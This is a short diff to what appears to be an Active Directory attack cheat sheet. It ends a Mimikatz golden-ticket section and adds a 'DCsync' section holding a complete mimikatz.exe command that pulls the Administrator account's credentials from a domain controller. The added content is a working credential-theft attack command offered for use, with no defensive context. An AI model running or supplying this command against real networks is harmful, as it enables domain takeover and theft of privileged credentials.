@@ -53,3 +53,9 @@ kerberos::golden /user:ADMIINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:
 - /aes128 – the AES128 key
 - /aes256 – the AES256 key
 ```
+---
+
+### DCsync
+```powershell
+mimikatz.exe "privilege::debug" "lsadump::dcsync /user:Administrator" "exit"
+```
